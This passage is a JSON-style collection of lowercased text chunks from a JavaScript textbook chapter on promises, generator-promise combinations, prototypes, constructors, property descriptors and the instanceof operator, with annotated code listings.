ninjadelayedpromise to schedule a callback to be executed when the promise successfully resolves:  ninjadelayedpromise.then(ninja => {  assert(ninja === \"hattori\",  \"ninjadelayedpromise resolve handled with hattori\");  });  this callback will always be called asynchronously, regardless of the current state of the promise.", "javascript-6.3.2.txt__4": "afterward, we use the ninjaimmediatepromise's then method to register a callback that will be executed when the promise successfully resolves. but our promise is already settled; does this mean that the success callback will be immediately called or that it will be ignored? the answer is neither.", "javascript-6.3.3.txt__1": "6.3.3. rejecting promises  there are two ways of rejecting a promise: explicitly, by calling the passed-in reject method in the executor function of a promise, and implicitly, if during the handling of a promise, an unhandled exception occurs. let's start our exploration with the following listing.  listing 6.12. explicitly rejecting promises  const promise = new promise((resolve, reject) => {  reject(\"explicitly reject a promise!\");  #a  });  promise.then(  () => fail(\"happy path, won't be called!\"),  error => pass(\"a promise was explicitly rejected!\")  #b  );  #a - a promise can be explicitly rejected by calling the passed-in reject function.  #b - if a promise is rejected, the second, error, callback is invoked.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":1,\\\"ch\\\":2},{\\\"line\\\":1,\\\"ch\\\":41}]]\"}  !@%style%@!  we can explicitly reject a promise, by calling the passed-in reject method: reject(\"explicitly reject a promise!\"). if a promise is rejected, when registering callbacks through the then method, the second, error, callback will always be invoked.  in addition, we can use an alternative syntax for handling promise rejections, by using the built-in catch method, as shown in the following listing.  listing 6.13. chaining a catch method  var promise = new promise((resolve, reject) => {  reject(\"explicitly reject a promise!\");  });  promise.then(()=> fail(\"happy path, won't be called!\"))  .catch(() => pass(\"promise was also rejected\"));  #a  #a - instead of supplying the second, error, callback, we can chain in the catch method, and pass to it the error callback. the end result is the same.  !@%style%@!", "javascript-6.3.3.txt__2": "!@%style%@!", "javascript-6.3.3.txt__3": "in addition to explicit rejection (via the reject call), a promise can also be rejected implicitly, if an exception occurs during its processing. take a look at the following example.  listing 6.14. exceptions implicitly reject a promise  const promise = new promise((resolve, reject) => {  undeclaredvariable++;  #a  });  promise.then(() => fail(\"happy path, won't be called!\"))  .catch(error => pass(\"third promise was also rejected\"));  #b  #a - a promise is implicitly rejected if an unhandled exception occurs when processing the promise.  #b - if an exception occurs, the second, error, callback is invoked.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-6.3.3.txt__4": "this way of treating all problems that happen while working with promises in a uniform way is extremely handy. regardless of how the promise was rejected, whether explicitly by calling the reject method or even implicitly, if an exception occurs, all errors and rejection reasons are directed to our rejection callback. this makes our lives as developers a little easier.", "javascript-6.3.4.txt__1": "6.3.4. creating our first real-world promise  one of the most common asynchronous actions on the client is fetching data from the server. as such, this is an excellent little case study on the use of promises. for the underlying implementation, we'll use the built-in xmlhttprequest object.  listing 6.15. creating a getjson promise  function getjson(url) {  return new promise((resolve, reject) => {  #a  const request = new xmlhttprequest();  #b  request.open(\"get\", url);  #c  request.onload = function() {  #d  try {  if(this.status === 200 ){  #e  resolve(json.parse(this.response));  #f  } else{  reject(this.status + \" \" + this.statustext);  #g  #g  } catch(e){  #g  reject(e.message);  #g  #g  };  request.onerror = function() {  #h  reject(this.status + \" \" + this.statustext);  #h  };  #h  request.send();  #i  });  getjson(\"data/ninjas.json\").then(ninjas => {  #j  assert(ninjas !== null, \"ninjas obtained!\");  #j  }).catch(e => fail(\"shouldn't be here:\" + e));  #j  #a - creates and returns a new promise  #b - creates an xmlhttprequest object  #c - initializes the request  #d - registers an onload handler that will be called if the server has responded  #e - even if the server has responded, it doesn't mean everything went as expected. use the result only if the server responds with status 200 (everything ok).  #f - try to parse the json string; if it succeeds, resolve the promise as successful with the parsed object.  #g - if the server responds with a different status code, or if there's an exception parsing the json string, reject the promise.  #h - if there's an error while communicating with the server, reject the promise.  #i - sends the request  #j - uses the promise created by the getjson function to register resolve and reject callbacks  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  note  executing this example, and all subsequent examples that reuse this function, requires a running server. you can, for example, use www.npmjs.com/package/http-server.", "javascript-6.3.4.txt__2": "if an error in the communication happens, we definitely won't be able to get our data from the server, so the honest thing to do is to reject our promise:  request.onerror = function(){  reject(this.status + \" \" + this.statustext);  };", "javascript-6.3.4.txt__3": "even if the server has successfully responded with data, this still doesn't mean that we're in the clear. because our goal was to get json-formatted objects from the server, the json code could always have syntax errors. this is why, when calling the json.parse method, we surround the code with a try-catch statement. if an exception occurs while parsing the server response, we also reject the promise. with this, we've taken care of all bad scenarios that can happen.", "javascript-6.3.4.txt__4": "if everything goes according to plan, and we successfully obtain our objects, we can safely resolve the promise. finally, we can use our getjson function to fetch ninjas from the server:  getjson(\"data/ninjas.json\").then(ninjas => {  assert(ninjas !== null, \"ninjas obtained!\");  }).catch(e => fail(\"shouldn't be here:\" + e));", "javascript-6.3.5.txt__1": "6.3.5. chaining promises  you've already seen how handling a sequence of interdependent steps leads to the pyramid of doom, a deeply nested and difficult-to-maintain sequence of callbacks. promises are a step toward solving that problem, because they have the ability to be chained.", "javascript-6.3.5.txt__2": "listing 6.16. chaining promises with then  getjson(\"data/ninjas.json\")  .then(ninjas => getjson(ninjas[0].missionsurl))  #a  .then(missions => getjson(missions[0].detailsurl))  #a  .then(mission => assert(mission !== null, \"ninja mission obtained!\"))  #a  .catch(error => fail(\"an error has occurred\"));  #b  #a - specifies multiple sequential steps by chaining in then calls  #b - catches promise rejections in any of the steps  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-6.3.5.txt__3": "writing such code using standard callbacks would result in a deeply nested sequence of callbacks. identifying the exact sequence of steps wouldn't be easy, and god forbid we decide to add in an extra step somewhere in the middle.  catching errors in chained promises", "javascript-6.3.6.txt__1": "6.3.6. waiting for a number of promises", "javascript-6.3.6.txt__2": "listing 6.17. waiting for a number of promises with promise.all  promise.all([getjson(\"data/ninjas.json\"),  #a  getjson(\"data/mapinfo.json\"),  #a  getjson(\"data/plan.json\")]).then(results => {  #a  const ninjas = results[0], mapinfo = results[1], plan = results[2]; #b  #b  assert(ninjas !== undefined  #b  && mapinfo !== undefined && plan !== undefined,  #b  \"the plan is ready to be set in motion!\");  #b  }).catch(error => {  fail(\"a problem in carrying out our plan!\");  });  #a - the promise.all method takes an array of promises, and creates a new promise that succeeds if all promises succeed, and fails if even one promise fails.  #b - the result is an array of succeed values, in the order of passed-in promises.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":0,\\\"ch\\\":0},{\\\"line\\\":0,\\\"ch\\\":11}],[{\\\"line\\\":12,\\\"ch\\\":9},{\\\"line\\\":12,\\\"ch\\\":20}]]\"}  !@%style%@!", "javascript-6.3.6.txt__3": "the promise.all method waits for all promises in a list. but at times we have numerous promises, but we care only about the first one that succeeds (or fails). meet the promise.race method.  racing promises  imagine that we have a group of ninjas at our disposal, and that we want to give an assignment to the first ninja who answers our call. when dealing with promises, we can write something like the following listing.  listing 6.18. racing promises with promise.race  promise.race([getjson(\"data/yoshi.json\"),  getjson(\"data/hattori.json\"),  getjson(\"data/hanzo.json\")])  .then(ninja => {  assert(ninja !== null, ninja.name + \" responded first\");  }).catch(error => fail(\"failure!\"));  it's simple as that. there's no need for manually tracking everything. we use the promise.race method to take an array of promises and return a completely new promise that resolves or rejects as soon as the first of the promises resolves or rejects.", "javascript-6.3.txt__1": "6.3. working with promises  in javascript, we rely a lot on asynchronous computations, computations whose results we don't have yet but will at some later point. so es6 has introduced a new concept that makes handling asynchronous tasks easier: promises.", "javascript-6.3.txt__2": "creating a new promise is easy, as you can see in the following example.  listing 6.10. creating a simple promise  const ninjapromise = new promise((resolve, reject) => {  #a  resolve(\"hattori\");  #b  //reject(\"an error resolving a promise!\");  #b  });  ninjapromise.then(ninja => {  #c  assert(ninja === \"hattori\", \"we were promised hattori!\");  #c  }, err => {  #d  fail(\"there shouldn't be an error\")  #d  });  #d  #a - creates a promise by calling a built-in promise constructor and passing in a callback function with two parameters: resolve and reject  #b - a promise is successfully resolved by calling the passed-in resolve function (and rejected by calling the reject function).  #c - by using the then method on a promise, we can pass in two callbacks; the first is called if a promise is successfully resolved.  #d - and the second is called if an error occurs.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-6.3.txt__3": "this code uses the promise by calling the built-in then method on the promise object, a method to which we pass two callback functions: a success callback and a failure callback. the former is called if the promise is resolved successfully (if the resolve function is called on the promise), and the latter is called if there's a problem (either an unhandled exception occurs or the reject function is called on a promise).", "javascript-6.4.1.txt__1": "6.4.1. looking forward\u2014the async function", "javascript-6.4.1.txt__2": "for these situations, the current plan is to include two new keywords, async and await, that would take care of this boilerplate code. soon, we'll be able to write something like this:  (async function (){  try {  const ninjas = await getjson(\"data/ninjas.json\");  const missions = await getjson(missions[0].missionsurl);  console.log(missions);  catch(e) {  console.log(\"error: \", e);  })()", "javascript-6.4.txt__1": "6.4. combining generators and promises", "javascript-6.4.txt__2": "all of these subtasks are long-running and mutually dependent. if we were to implement them in a synchronous fashion, we'd get the following straightforward code:  try {  const ninjas = syncgetjson(\"data/ninjas.json\");  const missions = syncgetjson(ninjas[0].missionsurl);  const missiondetails = syncgetjson(missions[0].detailsurl);  //study the mission description  } catch(e){  //oh no, we weren't able to get the mission details  although this code is great for its simplicity and error handling, it blocks the ui, which results in unhappy users. ideally, we'd like to change this code so that no blocking occurs during a long-running task. one way of doing this is by combining generators and promises.", "javascript-6.4.txt__3": "the idea, then, is to combine generators and promises in the following way: we put the code that uses asynchronous tasks in a generator, and we execute that generator function. when we reach a point in the generator execution that calls an asynchronous task, we create a promise that represents the value of that asynchronous task. because we have no idea when that promise will be resolved (or even if it will be resolved), at this point of generator execution, we yield from the generator, so that we don't cause blocking. after a while, when the promise gets settled, we continue the execution of our generator by calling the iterator's next method. we do this as many times as necessary. see the following listing for a practical example.", "javascript-6.4.txt__4": "listing 6.19. combining generators and promises  async(function*(){  #a  try {  const ninjas = yield getjson(\"data/ninjas.json\");  #b  const missions = yield getjson(ninjas[0].missionsurl);  #b  const missiondescription = yield getjson(missions[0].detailsurl);  #b  //study the mission details  catch(e) {  #c  //oh no, we weren't able to get the mission details  #c  #c  });  function async(generator) {  #d  var iterator = generator();  #e  function handle(iteratorresult) {  #f  if(iteratorresult.done) { return; }  #g  const iteratorvalue = iteratorresult.value;  if(iteratorvalue instanceof promise) {  #h  iteratorvalue.then(res => handle(iterator.next(res))  #h  .catch(err => iterator.throw(err));  #h  #h  try {  #i  handle(iterator.next());  #i  #i  catch (e) { iterator.throw(e); }  #i  #a - the function using asynchronous results should be able to pause while waiting for results. notice the function*. we're using generators!  #b - yield on each asynchronous task.  #c - we can still use all standard language constructs such as try-catch statements or loops.  #d - defines a helper function that will control our generator  #e - creates an iterator through which we'll control the generator  #f - defines the function that will handle each value generated by the generator  #g - stops when the generator has no more results  #h - if the generated value is a promise, register a success and a failure callback. this is the asynchronous part. if the promise succeeds, great, resume the generator and send in the promised value. if there's an error, throw an exception to the generator  #i - restarts the generator execution.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-6.4.txt__5": "note  this is a rough sketch, a minimum amount of code needed to combine generators and promises. we don't recommend that you use this code in production.", "javascript-6.4.txt__6": "much, much later, when the browser receives a response (either a positive or a negative one), one of the promise callbacks is invoked. if the promise was resolved successfully, the success callback is invoked, which in turn causes the execution of the iterator's next method, which asks the generator for another value. this brings back the generator from suspension and sends to it the value passed in by the callback. this means that we reenter the body of our generator, after the first yield expression, whose value becomes the ninjas list that was asynchronously fetched from the server. the execution of the generator function continues, and the value is assigned to the plan variable.", "javascript-6.4.txt__7": "in the next line of the generator, we use some of the obtained data, ninjas[0].missionurl, to make another getjson call that creates another promise that should eventually contain a list of missions done by the most popular ninja. again, because this is an asynchronous task, we have no idea how long it's going to take, so we again yield the execution and repeat the whole process.", "javascript-6.4.txt__8": "this process is repeated as long as there are asynchronous tasks in the generator.  this was a tad on the complex side, but we like this example because it combines a lot of things that you've learned so far:  functions as first-class objects\u2014 we send a function as an argument to the async function.  generator functions\u2014 we use their ability to suspend and resume execution.  promises\u2014 they help us deal with asynchronous code.  callbacks\u2014 we register success and failure callbacks on our promises.  arrow functions\u2014 because of their simplicity, for callbacks we use arrow functions.  closures\u2014 the iterator, through which we control the generator, is created in the async function, and we access it, through closures, in the promise callbacks.  now that we've gone through the whole process, let's take a minute to appreciate how much more elegant the code that implements our business logic is. consider this:  getjson(\"data/ninjas.json\", (err, ninjas) => {  if(err) { console.log(\"error fetching ninjas\", err); return; }  getjson(ninjas[0].missionsurl, (err, missions) => {  if(err) { console.log(\"error locating ninja missions\", err); return; }  console.log(misssions);  })  });  instead of mixed control-flow and error handling, and slightly confusing code, we end up with something like this:  async(function*() {  try {  const ninjas = yield getjson(\"data/ninjas.json\");  const missions = yield getjson(ninjas[0].missionsurl);  //all information recieved  catch(e) {  //an error has occurred  });", "javascript-6.5.txt__1": "6.5. summary  generators are functions that generate sequences of values\u2014not all at once, but on a per request basis.  unlike standard functions, generators can suspend and resume their execution. after a generator has generated a value, it suspends its execution without blocking the main thread and patiently waits for the next request.  a generator is declared by putting an asterisk (*) after the function keyword. within the body of the generator, we can use the new yield keyword that yields a value and suspends the execution of the generator. if we want to yield to another generator, we use the yield* operator.", "javascript-7.1.txt__1": "7.1. understanding prototypes  in javascript, objects are collections of named properties with values. for example, we can easily create new objects with object-literal notation:  let obj = {  prop1: 1,  #a  prop2: function(){},  #b  prop3: {}  #c  #a - assigns a simple value  #b - assigns a function  #c - assigns another object  !@%style%@!", "javascript-7.1.txt__2": "!@%style%@!  as we can see, object properties can be simple values (such as numbers or strings), functions, and even other objects. in addition, javascript is a highly dynamic language, and the properties assigned to an object can be easily changed by modifying and deleting existing properties:  obj.prop1 = 1;  #a  obj.prop1 = [];  #b  delete obj.prop2;  #c  #a - prop1 stores a simple number.  #b - assigns a value of a completely different type, here an array  #c - removes the property from the object  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  we can even add completely new properties:  obj.prop4 = \"hello\";  #a  #a - adds a completely new property  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":2,\\\"ch\\\":0},{\\\"line\\\":2,\\\"ch\\\":35}]]\"}  !@%style%@!  in the end, all these modifications have left our simple object in the following state:  prop1: [],  prop3: {},  prop4: \"hello\"  };  when developing software, we strive not to reinvent the wheel, so we want to reuse as much code as possible. one form of code reuse that also helps organize our programs is inheritance, extending the features of one object into another. in javascript, inheritance is implemented with prototyping.", "javascript-7.1.txt__3": "let's take a look at the following listing.  listing 7.1. with prototypes, objects can access properties of other objects  const yoshi = { skulk: true };  #a  const hattori = { sneak: true };  #a  const kuma = { creep: true };  #a  assert(\"skulk\" in yoshi, \"yoshi can skulk\");  #b  assert(!(\"sneak\" in yoshi)), \"yoshi cannot sneak\");  #b  assert(!(\"creep\" in yoshi)), \"yoshi cannot creep\");  #b  object.setprototypeof(yoshi, hattori);  #c  assert(\"sneak\" in yoshi, \"yoshi can now sneak\");  #d  assert(!(\"creep\" in hattori)), \"hattori cannot creep\");  #e  object.setprototypeof(hattori, kuma);  #f  assert(\"creep\" in hattori, \"hattori can now creep\");  #g  assert(\"creep\" in yoshi, \"yoshi can also creep\");  #h  #a - creates three objects, each with its own property  #b - yoshi has access to only its own, skulk, property  #c - use the object.setprototypeof method to set one object as the prototype of another object.  #d - by setting hattori as yoshi's prototype, yoshi now has access to hattori's properties.  #e - currently, hattori can't creep.  #f - sets kuma as a prototype of hattori  #g - now hattori has access to creep.  #h - yoshi also has access to creep, through hattori.  !@%style%@!", "javascript-7.1.txt__4": "!@%style%@!  in this example, we start by creating three objects: yoshi, hattori, and kuma. each has one specific property accessible only to that object: only yoshi can skulk, only hattori can sneak, and only kuma can creep. see figure 7.1.  figure 7.1. initially, each object has access to only its own properties.  to test whether an object has access to a particular property, we can use the in operator. for example, executing skulk in yoshi returns true, because yoshi has access to the skulk property; whereas executing sneak in yoshi returns false.", "javascript-7.1.txt__5": "as a result, whenever we ask yoshi for a property that it doesn't have, yoshi delegates that search to hattori. we can access hattori's sneak property through yoshi. see figure 7.2.  figure 7.2. when we access a property that the object doesn't have, the object's prototype is searched for that property. here, we can access hattori's sneak property through yoshi, because yoshi is hattori's prototype.", "javascript-7.1.txt__6": "figure 7.3. the search for a particular property stops when there are no more prototypes to explore. accessing yoshi.creep triggers the search first in yoshi, then in hattori, and finally in kuma.", "javascript-7.2.1.txt__1": "7.2.1. instance properties", "javascript-7.2.1.txt__2": "listing 7.3. observing the precedence of initialization activities  function ninja(){  this.swung = false;  #a  this.swingsword = function(){  #b  return !this.swung;  #b  };  ninja.prototype.swingsword = function(){  #c  return this.swung;  #c  };  #c  const ninja = new ninja();  #d  assert(ninja.swingsword(),  #d  \"called the instance method, not the prototype method.\");  #d  #a - creates an instance variable that holds a boolean value initialized to false  #b - creates an instance method that returns the inverse of the swung instance variable value  #c - defines a prototype method with the same name as the instance method. which will take precedence?  #d - constructs a ninja instance and asserts that the instance method will override the prototype method of the same name  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  listing 7.3 is similar to the previous example in that we define a swingsword method by adding it to the prototype property of the constructor:  ninja.prototype.swingsword = function(){  return this.swung;  };  but we also add an identically named method within the constructor function itself:  function ninja(){  this.swung = false;  this.swingsword = function(){  return !this.swung;  };  the two methods are defined to return opposing results so we can tell which will be called.  note  this isn't anything we'd advise doing in real-world code; quite the opposite. we're doing it here just to demonstrate the precedence of properties.  when you run the test, you see that it passes! this shows that instance members will hide properties of the same name defined in the prototype. see figure 7.5.  figure 7.5. if a property can be found on the instance itself, the prototype isn't even consulted!", "javascript-7.2.1.txt__3": "this has an interesting side effect. take a look at figure 7.6, which shows the state of the application if we create three ninja instances.  figure 7.6. every instance gets its own version of the properties created within the constructor, but they all have access to the same prototype's properties.", "javascript-7.2.1.txt__4": "in this example, we'd have three versions of the swingsword method that all perform the same logic. this isn't a problem if we create a couple of objects, but it's something to pay attention to if we plan to create large numbers of objects. because each method copy behaves the same, creating multiple copies often doesn't make sense, because it only consumes more memory. sure, in general, the javascript engine might perform some optimizations, but that's not something to rely on. from that perspective, it makes sense to place object methods only on the function's prototype, because in that way we have a single method shared by all object instances.", "javascript-7.2.2.txt__1": "7.2.2. side effects of the dynamic nature of javascript  you've already seen that javascript is a dynamic language in which properties can be easily added, removed, and modified at will. the same thing holds for prototypes, both function prototypes and object prototypes. see the following listing.  listing 7.4. with prototypes, everything can be changed at runtime  function ninja(){  #a  this.swung = true;  #a  #a  const ninja1 = new ninja();  #b  ninja.prototype.swingsword = function(){  #c  return this.swung;  #c  };  #c  assert(ninja1.swingsword(),  \"method exists, even out of order.\");  #d  ninja.prototype = {  #e  pierce: function() {  #e  return true;  #e  #e  #e  assert(ninja1.swingsword(),  #f  \"our ninja can still swing!\");  #f  const ninja2 = new ninja();  #g  assert(ninja2.pierce(),\"newly created ninjas can pierce\");  #g  assert(!ninja2.swingsword, \"but they cannot swing!\");  #g  #a - defines a constructor that creates a ninja with a single boolean property  #b - creates an instance of ninja by calling the constructor function via the \u201cnew\u201d operator  #c - adds a method to the prototype after the object has been created  #d - shows that the method exists in the object  #e - completely overrides the ninja's prototype with a new object via the pierce method  #f - even though we've completely replaced the ninja constructor's prototype, our ninja can still swing a sword, because it keeps a reference to the old ninja prototype.  #g - newly created ninjas reference the new prototype, so they can pierce but can't swing.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  here we again define a ninja constructor and proceed to use it to create an object instance. the state of the application at this moment is shown in figure 7.7.  figure 7.7. after construction, ninja1 has the property swung, and its prototype is the ninja prototype that has only a constructor property.  after the instance has been created, we add a swingsword method to the prototype. then we run a test to show that the change we made to the prototype after the object was constructed takes effect. the current state of the application is shown in figure 7.8.  figure 7.8. because the ninja1 instance references the ninja prototype, even changes made after the instance was constructed are accessible.  later, we override the ninja function's prototype by assigning it to a completely new object that has a pierce method. this results in the application state shown in figure 7.9.  figure 7.9. the function's prototype can be replaced at will. the already constructed instances reference the old prototype!", "javascript-7.2.2.txt__2": "figure 7.10. all newly created instances reference the new prototype.", "javascript-7.2.3.txt__1": "7.2.3. object typing via constructors", "javascript-7.2.3.txt__2": "figure 7.11. the prototype object of each function has a constructor property that references the function.  by using the constructor property, we can access the function that was used to create the object. this information can be used as a form of type checking, as shown in the next listing.  listing 7.5. examining the type of an instance and its constructor  function ninja(){}  const ninja = new ninja();  assert(typeof ninja === \"object\",  #a  \"the type of the instance is object.\");  assert(ninja instanceof ninja,  #b  \"instanceof identifies the constructor.\" );  assert(ninja.constructor === ninja,  #c  \"the ninja object was created by the ninja function.\");  #a - tests the type of ninja via typeof. this tells us it's an object, but not much else.  #b - tests the type of ninja via instanceof. this provides more information\u2014that it was constructed from ninja.  #c - tests the type of ninja via the constructor reference. this gives a reference to the constructor function.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-7.2.3.txt__3": "in addition, we can use the constructor property, that we now know is accessible to all instances, as a reference to the original function that created it. we can use this to verify the origin of the instance (much as we can with the instanceof operator).  additionally, because this is just a reference to the original constructor, we can instantiate a new ninja object using it, as shown in the next listing.  listing 7.6. instantiating a new object using a reference to a constructor  function ninja(){}  const ninja = new ninja();  const ninja2 = new ninja.constructor();  #a  assert(ninja2 instanceof ninja, \"it's a ninja!\");  #b  assert(ninja !== ninja2, \"but not the same ninja!\");  #c  #a - constructs a second ninja from the first  #b - proves the new object's ninja-ness  #c - they aren't the same object, but two distinct instances.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  here we define a constructor and create an instance using that constructor. then we use the constructor property of the created instance to construct a second instance. testing shows that a second ninja has been constructed and that the variable doesn't merely point to the same instance.  what's especially interesting is that we can do this without even having access to the original function; we can use the reference completely behind the scenes, even if the original constructor is no longer in scope.  note", "javascript-7.2.txt__1": "7.2. object construction and prototypes  the simplest way to create a new object is with a statement like this:  const warrior = {};  this creates a new and empty object, which we can then populate with properties via assignment statements:  const warrior = {};  warrior.name = 'saito';  warrior.occupation = 'marksman';", "javascript-7.2.txt__2": "javascript provides such a mechanism, though in a different form than most other languages. like object-oriented languages such as java and c++, javascript employs the new operator to instantiate new objects via constructors, but there's no true class definition in javascript. instead, the new operator, applied to a constructor function (as you saw in chapter 3), triggers the creation of a newly allocated object.", "javascript-7.2.txt__3": "what we didn't learn in the previous chapters was that every function has a prototype object that's automatically set as the prototype of the objects created with that function. let's see how that works in the following listing.  listing 7.2. creating a new instance with a prototyped method  function ninja(){}  #a  ninja.prototype.swingsword = function(){  #b  return true;  #b  };  #b  const ninja1 = ninja();  #c  assert(ninja1 === undefined,  #c  \"no instance of ninja created.\");  #c  const ninja2 = new ninja();  #d  assert(ninja2 &&  #d  ninja2.swingsword &&  #d  ninja2.swingsword(),  #d  \"instance exists and method is callable.\" );  #d  #a - defines a function that does nothing and returns nothing  #b - every function has a built-in prototype object, which we can freely modify.  #c - calls the function as a function. testing confirms that nothing at all seems to happen.  #d - calls the function as a constructor. testing confirms that not only is a new object instance created, but it possesses the method from the prototype of the function.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":9,\\\"ch\\\":15},{\\\"line\\\":9,\\\"ch\\\":18}],[{\\\"line\\\":18,\\\"ch\\\":78},{\\\"line\\\":18,\\\"ch\\\":81}]]\"}  !@%style%@!  in this code, we define a seemingly do-nothing function named ninja that we'll invoke in two ways: as a \u201cnormal\u201d function, const ninja1 = ninja(); and as a constructor, const ninja2 = new ninja();.  when the function is created, it immediately gets a new object assigned to its prototype object, an object that we can extend just like any other object. in this case, we add a swingsword method to it:  ninja.prototype.swingsword = function(){  return true;  };", "javascript-7.2.txt__4": "then we call the function via the new operator, invoking it as a constructor, and something completely different happens. the function is once again called, but this time a newly allocated object has been created and set as the context of the function (and is accessible through the this keyword). the result returned from the new operator is a reference to this new object. we then test that ninja2 has a reference to the newly created object, and that that object has a swingsword method that we can call. see figure 7.4 for a glimpse of the current application state.", "javascript-7.2.txt__5": "figure 7.4. every function, when created, gets a new prototype object. when we use a function as a constructor, the constructed object's prototype is set to the function's prototype.  as you can see, a function, when created, gets a new object that's assigned to its prototype property. the prototype object initially has only one property, constructor, that references back to the function (we'll revisit the constructor property later).  when we use a function as a constructor (for example, by calling new ninja()), the prototype of the newly constructed object is set to the object referenced by the constructor function's prototype.", "javascript-7.3.1.txt__1": "7.3.1. the problem of overriding the constructor property", "javascript-7.3.1.txt__2": "assert(ninja.constructor === ninja,  \"the ninja object was created by the ninja constructor\");", "javascript-7.3.1.txt__3": "it's up to us to fix this situation! but before we can do that, we have to take a detour and see how javascript enables us to configure properties.  configuring object properties  in javascript, every object property is described with a property descriptor through which we can configure the following keys:  configurable\u2014if set to true, the property's descriptor can be changed and the property can be deleted. if set to false, we can do neither of these things.  enumerable\u2014if set to true, the property shows up during a for-in loop over the object's properties (we'll get to the for-in loop soon).  value\u2014specifies the value of the property. defaults to undefined.  writable\u2014if set to true, the property value can be changed by using an assignment.  get\u2014defines the getter function, which will be called when we access the property. can't be defined in conjunction with value and writable.  set\u2014defines the setter function, which will be called whenever an assignment is made to the property. also can't be defined in conjunction with value and writable.  say we create a property through a simple assignment, for example:  ninja.name = \"yoshi\";  this property will be configurable, enumerable, and writable, its value will be set to yoshi, and functions get and set would be undefined.  when we want to fine-tune our property configuration, we can use the built-in object.defineproperty method, which takes an object on which the property will be defined, the name of the property, and a property descriptor object. as an example, take a look at the following code.  listing 7.9. configuring properties  var ninja = {};  #a  ninja.name = \"yoshi\";  #a  ninja.weapon = \"kusarigama\";  #a  object.defineproperty(ninja, \"sneaky\", {  #b  configurable: false,  #b  enumerable: false,  #b  value: true,  #b  writable: true  #b  });  #b  assert(\"sneaky\" in ninja, \"we can access the new property\");  for(let prop in ninja){  #c  assert(prop !== undefined, \"an enumerated property: \" + prop);  #c  #c  #a - creates an empty object; uses assignments to add two properties  #b - the built-in object.defineproperty method is used to fine-tune the property configuration details.  #c - uses the for-in loop to iterate over ninja's enumerable properties  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-7.3.1.txt__4": "finally, we test that we can access the newly created sneaky property, and we use the for-in loop to go through all enumerable properties of the object. figure 7.15 shows the result.  figure 7.15. properties name and weapon will be visited in the for-in loop, whereas our specially added sneaky property won't (even though we can access it normally).  by setting enumerable to false, we can be sure that the property won't appear when using the for-in loop. to understand why we'd want to do something like this, let's go back to the original problem.  finally solving the problem of overriding the constructor property", "javascript-7.3.1.txt__5": "we can solve this problem by using the knowledge that we've just obtained. we'll define a new constructor property on the new ninja.prototype by using the object.defineproperty method. see the following listing.  listing 7.10. fixing the constructor property problem  function person(){}  person.prototype.dance = function(){};  function ninja(){}  ninja.prototype = new person();  object.defineproperty(ninja.prototype, \"constructor\", {  #a  enumerable: false,  #a  value: ninja,  #a  writable: true  #a  });  #a  var ninja = new ninja();  assert(ninja.constructor === ninja,  #b  \"connection from ninja instances to ninja constructor  #b  reestablished!\");  #b  for(let prop in ninja.prototype){  #c  assert(prop === \"dance\", \"the only enumerable property is dance!\");  #c  #c  #a - we define a new non-enumerable constructor property pointing back to ninja.  #b - we've reestablished the connection.  #c - we haven't added any enumerable properties to the ninja.prototype.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":4,\\\"ch\\\":16},{\\\"line\\\":4,\\\"ch\\\":31}]]\"}  !@%style%@!", "javascript-7.3.2.txt__1": "7.3.2. the instanceof operator", "javascript-7.3.2.txt__2": "although certain parallels could be made with how the instanceof operator works in javascript, there's a little twist. in javascript, the instanceof operator works on the prototype chain of the object. for example, say we have the following expression:  ninja instanceof ninja  the instanceof operator works by checking whether the current prototype of the ninja function is in the prototype chain of the ninja instance. let's go back to our persons and ninjas, for a more concrete example.  listing 7.11. studying the instanceof operator  function person(){}  function ninja(){}  ninja.prototype = new person();  const ninja = new ninja();  assert(ninja instanceof ninja, \"our ninja is a ninja!\");  #a  assert(ninja instanceof person, \"a ninja is also a person. \");  #a  #a - a ninja instance is both a ninja and a person.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":10,\\\"ch\\\":0},{\\\"line\\\":10,\\\"ch\\\":51}]]\"}  !@%style%@!  as expected, a ninja is, at the same time, a ninja and a person. but, to nail down this point, figure 7.16 shows how the whole thing works behind the scenes.  figure 7.16. the prototype chain of a ninja instance is composed of a new person() object and the person prototype.", "javascript-7.3.2.txt__3": "in the second case, where we check ninja instanceof person, the javascript engine takes the prototype of the person function, the person prototype, and checks whether it can be found in the prototype chain of the ninja instance. again, it can, because it's the prototype of our new person() object, which, as we've already seen, is the prototype of the ninja instance.", "javascript-7.3.2.txt__4": "and that's all there is to know about the instanceof operator. although its most common use is in providing a 